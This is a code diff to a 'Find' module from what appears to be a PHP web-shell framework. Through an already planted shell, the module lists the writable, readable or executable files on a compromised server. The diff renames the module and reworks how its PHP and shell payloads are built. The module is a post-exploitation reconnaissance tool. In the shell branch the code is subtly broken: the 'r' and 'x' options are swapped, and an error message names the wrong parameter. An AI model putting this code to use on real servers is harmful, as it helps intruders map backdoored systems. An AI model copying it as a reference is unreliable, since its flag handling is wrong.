@@ -10,11 +10,11 @@ classname = 'Find'
     
 class Find(Module):
     '''Find writable|readable|executable|all file for current user
-    find.file first|all file|dir|all w|r|x|all <path> 
+    find.find first|all file|dir|all w|r|x|all <path> 
     '''
     
     php_method = '''
-@swp(%s,%s,%s',%s);
+@swp('%s','%s','%s','%s');
 function ckmod($df, $m) { return ($m=="all")||($m=="w"&&is_writable($df))||($m=="r"&&is_readable($df))||($m=="x"&&is_executable($df)); }
 function cktp($df, $f, $t) { return ($f!='.')&&($f!='..')&&($t=='all'||($t=='file'&&@is_file($df))||($t=='dir'&&@is_dir($df))); }
 function swp($d, $qty, $type, $mod){
@@ -22,8 +22,8 @@ function swp($d, $qty, $type, $mod){
             while ($f = @readdir($h)) {
                     $df=$d.'/'.$f;
                     if(@cktp($df,$f,$type)&&@ckmod($df,$mod)) {
-                            print($df."\n");
-                            if($qty=="first") die();
+                            print($df."\\n");
+                            if($qty=="first") return;
                     }
                     if(@cktp($df,$f,'dir')){
                             @swp($df, $qty, $type, $mod);
@@ -31,9 +31,9 @@ function swp($d, $qty, $type, $mod){
             }
             @closedir($h);
 }
-    '''
+'''
     
-    sh_method = "find %s -writable %s %s 2>/dev/null"
+    sh_method = "find %s %s %s %s 2>/dev/null"
     
     vectors = {
                "shell.sh" : {
@@ -52,41 +52,42 @@ function swp($d, $qty, $type, $mod){
         Module.__init__(self, modhandler, url, password)
         
 
-    def __prepare_vector(self,interpreter, qty,type,mod):
+    def __prepare_vector(self,interpreter, path, qty,type,mod):
         
         if interpreter == 'shell.sh':
             if qty == 'first':
-                qty_string = '-print -quit'
+                qty = '-print -quit'
             elif qty == 'all':
-                qty_string = ''
+                qty = ''
             else:
-                raise ModuleException("find.writable",  "Find failed. Use first|all as first parameter.")
+                raise ModuleException("find.find",  "Find failed. Use first|all as first parameter.")
                 
             if type == 'all':
-                type_string = ''
+                type = ''
             elif type == 'file':
-                type_string = '-type f'
+                type = '-type f'
             elif type == 'dir':
-                type_string = '-type d'
+                type = '-type d'
             else:
-                raise ModuleException("find.writable",  "Find failed. Use file|dir|all as second parameter.")
+                raise ModuleException("find.find",  "Find failed. Use file|dir|all as second parameter.")
              
             if mod == 'all':
-                mod_string = ''
+                mod = ''
             elif mod == 'w':
-                mod_string = '-writable'
+                mod = '-writable'
             elif mod == 'r':
-                mod_string = '-executable'
+                mod = '-executable'
             elif mod == 'x':
-                mod_string = '-readable'
+                mod = '-readable'
             else:
-                raise ModuleException("find.writable",  "Find failed. Use file|dir|all as second parameter.")
+                raise ModuleException("find.find",  "Find failed. Use file|dir|all as second parameter.")
              
-            return (qty_string, type_string, mod_string)
         
         elif interpreter == 'shell.php':
-            return (qty, type, mod)
+            return (path, qty, type, mod)
         
+        
+        return (path, qty, type, mod)
 
     def run(self, qty, type, mod, path):
         
@@ -95,13 +96,21 @@ function swp($d, $qty, $type, $mod){
         for interpreter in self.vectors:
             if interpreter in self.modhandler.loaded_shells:
                 for vector in self.vectors[interpreter]:
+                    
+                    payload = self.vectors[interpreter][vector] % self.__prepare_vector(interpreter, path, qty, type, mod)
+                    print "[find.find] File read using method '%s'" % (vector)  
+                              
+                    if interpreter == 'shell.sh':       
+                        response = self.modhandler.load(interpreter).run(payload, False)
+                    elif interpreter == 'shell.php':
+                        response = self.modhandler.load(interpreter).run(payload)
+                        
+                    if response:
+                        return response
                 
-                    payload = self.vectors[interpreter][vector] % self.__prepare_vector(interpreter, qty, type, mod)
-                    print "[find.writable] File read using method '%s'" % (self.vector)  
-                                     
-                    return self.modhandler.load(interpreter).run(payload, False)
                 
-        raise ModuleException("find.writable",  "Find failed.")
+                
+        raise ModuleException("find.find",  "Find failed.")
             
 
         
